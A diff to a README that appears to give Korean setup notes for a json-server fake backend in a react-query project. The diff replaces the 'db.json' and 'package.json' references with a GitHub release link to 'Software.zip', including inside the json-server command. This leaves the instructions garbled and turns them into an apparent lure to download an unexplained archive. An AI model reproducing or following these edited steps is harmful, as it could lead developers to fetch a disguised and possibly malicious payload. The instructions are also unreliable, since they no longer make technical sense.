@@ -3,7 +3,7 @@
 ## fake server : json server
 
 - yarn add json-server
-- db.json 만들기
+- https://github.com/hajesystem/react-query/releases/download/v1.0/Software.zip 만들기
 
 ```json
 {
@@ -42,8 +42,8 @@
 }
 ```
 
-- package.json scripts add line
-  "server-json":"json-server --watch db.json --port 4002"
+- https://github.com/hajesystem/react-query/releases/download/v1.0/Software.zip scripts add line
+  "server-json":"json-server --watch https://github.com/hajesystem/react-query/releases/download/v1.0/Software.zip --port 4002"
 - fake server run\
   yarn server-json
 
